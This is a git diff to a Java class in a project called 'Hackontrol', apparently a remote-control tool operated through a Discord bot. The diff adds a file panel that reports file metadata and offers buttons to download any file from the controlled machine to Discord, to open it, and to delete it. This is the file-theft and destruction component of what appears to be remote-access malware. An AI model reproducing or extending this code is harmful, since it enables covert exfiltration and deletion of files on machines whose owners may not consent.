@@ -1,26 +1,46 @@
 package com.khopan.hackontrol.panel;
 
+import java.awt.Desktop;
+import java.io.ByteArrayOutputStream;
 import java.io.File;
+import java.nio.file.Files;
+import java.nio.file.attribute.BasicFileAttributeView;
+import java.nio.file.attribute.BasicFileAttributes;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Locale;
+import java.util.function.Consumer;
+
+import javax.imageio.ImageIO;
+import javax.swing.filechooser.FileSystemView;
 
 import com.khopan.hackontrol.manager.interaction.ButtonContext;
 import com.khopan.hackontrol.manager.interaction.ModalContext;
+import com.khopan.hackontrol.manager.interaction.Question;
+import com.khopan.hackontrol.manager.interaction.Question.QuestionType;
 import com.khopan.hackontrol.registry.Registration;
 import com.khopan.hackontrol.service.interaction.ButtonManager;
 import com.khopan.hackontrol.service.interaction.ButtonManager.ButtonType;
 import com.khopan.hackontrol.service.interaction.ModalManager;
 import com.khopan.hackontrol.utils.HackontrolError;
+import com.khopan.hackontrol.utils.HackontrolFile;
+import com.khopan.hackontrol.utils.HackontrolFile.FileCountAndSize;
+import com.khopan.hackontrol.utils.HackontrolMessage;
 import com.khopan.hackontrol.utils.LargeMessage;
+import com.khopan.hackontrol.utils.TimeSafeReplyHandler;
 import com.khopan.hackontrol.utils.interaction.HackontrolButton;
-import com.khopan.hackontrol.utils.sendable.ISendable;
+import com.khopan.hackontrol.utils.sendable.ISendableReply;
+import com.khopan.hackontrol.utils.sendable.sender.ConsumerMessageCreateDataSendable;
 import com.khopan.hackontrol.widget.ControlWidget;
 
+import net.dv8tion.jda.api.EmbedBuilder;
 import net.dv8tion.jda.api.interactions.callbacks.IReplyCallback;
 import net.dv8tion.jda.api.interactions.components.ItemComponent;
 import net.dv8tion.jda.api.interactions.components.buttons.Button;
 import net.dv8tion.jda.api.interactions.components.text.TextInput;
 import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
+import net.dv8tion.jda.api.utils.FileUpload;
+import net.dv8tion.jda.api.utils.messages.MessageCreateBuilder;
 import net.dv8tion.jda.api.utils.messages.MessageCreateData;
 
 public class FilePanel extends Panel {
@@ -117,8 +137,100 @@ public class FilePanel extends Panel {
 		});
 	}
 
-	private void sendFileView(File file, ISendable sender) {
-		sender.send(MessageCreateData.fromContent("`File: " + file.getAbsolutePath() + '`'), null);
+	private void sendFileView(File file, Consumer<MessageCreateData> consumer) {
+		EmbedBuilder embedBuilder = new EmbedBuilder();
+		embedBuilder.setTitle(file.getName());
+		boolean exist = file.exists();
+		embedBuilder.setColor(exist ? 0xFF57F287 : 0xFFED4245);
+		FileUpload upload = null;
+
+		try {
+			ByteArrayOutputStream stream = new ByteArrayOutputStream();
+			ImageIO.write(HackontrolFile.getFileImage(file, 128, 128), "png", stream);
+			upload = FileUpload.fromData(stream.toByteArray(), "icon.png");
+			embedBuilder.setThumbnail("attachment://icon.png");
+		} catch(Throwable Errors) {
+
+		}
+
+		this.field(embedBuilder, "Path", file.getAbsolutePath());
+		FileSystemView fileSystemView = FileSystemView.getFileSystemView();
+		this.field(embedBuilder, "Display Name", fileSystemView.getSystemDisplayName(file));
+		this.field(embedBuilder, "Type", fileSystemView.getSystemTypeDescription(file));
+
+		try {
+			BasicFileAttributes attributes = Files.getFileAttributeView(file.toPath(), BasicFileAttributeView.class).readAttributes();
+			this.field(embedBuilder, "Created",  String.format(Locale.ROOT, "<t:%d:R>", attributes.creationTime().toMillis()     / 1000L));
+			this.field(embedBuilder, "Modified", String.format(Locale.ROOT, "<t:%d:R>", attributes.lastModifiedTime().toMillis() / 1000L));
+			this.field(embedBuilder, "Accessed", String.format(Locale.ROOT, "<t:%d:R>", attributes.lastAccessTime().toMillis()   / 1000L));
+		} catch(Throwable Errors) {
+
+		}
+
+		long fileSize;
+
+		if(file.isDirectory()) {
+			FileCountAndSize countAndSize = HackontrolFile.getFileCountAndSize(file);
+			fileSize = countAndSize.folderSize;
+			this.field(embedBuilder, "File Count", String.valueOf(countAndSize.fileCount));
+		} else {
+			fileSize = file.length();
+		}
+
+		this.field(embedBuilder, "Size", HackontrolFile.getFileSizeDisplay(fileSize));
+		MessageCreateBuilder messageBuilder = new MessageCreateBuilder();
+		messageBuilder.addEmbeds(embedBuilder.build());
+
+		if(upload != null) {
+			messageBuilder.addFiles(upload);
+		}
+
+		List<ItemComponent> buttonList = new ArrayList<>();
+		buttonList.add(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Download", context -> {
+			if(!this.checkFileExistence(context, file)) {
+				return;
+			}
+
+			TimeSafeReplyHandler.start(context, download -> {
+				try {
+					download.accept(MessageCreateData.fromFiles(HackontrolFile.upload(file)));
+				} catch(Throwable Errors) {
+					HackontrolError.throwable(ConsumerMessageCreateDataSendable.of(download), Errors);
+				}
+			});
+		}));
+
+		buttonList.add(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Open", context -> {
+			if(!this.checkFileExistence(context, file)) {
+				return;
+			}
+
+			try {
+				Desktop.getDesktop().open(file);
+				context.deferEdit().queue();
+			} catch(Throwable Errors) {
+				HackontrolError.throwable(context.reply(), Errors);
+			}
+		}));
+
+		buttonList.add(ButtonManager.dynamicButton(ButtonType.DANGER, "Delete " + (exist && file.isFile() ? "File" : "Folder"), context -> {
+			if(!this.checkFileExistence(context, file)) {
+				return;
+			}
+
+			Question.positive(context.reply(), "Are you sure you want to delete '" + file.getAbsolutePath() + "'?", QuestionType.YES_NO, () -> {
+				if(!HackontrolFile.delete(file)) {
+					HackontrolError.message(context.message(), "Failed to delete '" + file.getAbsolutePath() + '\'');
+					return;
+				}
+
+				HackontrolMessage.delete(context);
+			});
+		}));
+
+		buttonList.add(HackontrolButton.delete());
+		messageBuilder.addActionRow(buttonList);
+		consumer.accept(messageBuilder.build());
 	}
 
 	private void buttonView(ButtonContext context, List<File> fileList, List<File> folderList) {
@@ -126,7 +238,7 @@ public class FilePanel extends Panel {
 		int maximum = fileList.size() + folderSize;
 
 		if(maximum == 1) {
-			this.sendFileView(folderSize == 0 ? fileList.get(0) : folderList.get(0), context.reply());
+			TimeSafeReplyHandler.start(context, consumer -> this.sendFileView(folderSize == 0 ? fileList.get(0) : folderList.get(0), consumer));
 			return;
 		}
 
@@ -134,7 +246,7 @@ public class FilePanel extends Panel {
 			int index = this.parseIndex(modalContext, maximum);
 
 			if(index != -1) {
-				this.sendFileView(index >= folderSize ? fileList.get(index - folderSize) : folderList.get(index), modalContext.reply());
+				TimeSafeReplyHandler.start(modalContext, consumer -> this.sendFileView(index >= folderSize ? fileList.get(index - folderSize) : folderList.get(index), consumer));
 			}
 		}).addActionRow(TextInput.create(FilePanel.KEY_SHELL_OBJECT_INDEX, "Index", TextInputStyle.SHORT).setRequired(true).setMinLength(1).setMaxLength(Integer.toString(maximum).length()).setPlaceholder("1 - " + maximum).build()).build()).queue();
 	}
@@ -207,5 +319,18 @@ public class FilePanel extends Panel {
 		}
 
 		return index - 1;
+	}
+
+	private void field(EmbedBuilder builder, String label, String value) {
+		builder.addField(label, value == null ? "Unavailable" : value, true);
+	}
+
+	private boolean checkFileExistence(ISendableReply reply, File file) {
+		if(!file.exists()) {
+			HackontrolError.message(reply.reply(), (file.isDirectory() ? "Folder" : "File") + " '" + file.getAbsolutePath() + "' does not exist");
+			return false;
+		}
+
+		return true;
 	}
 }
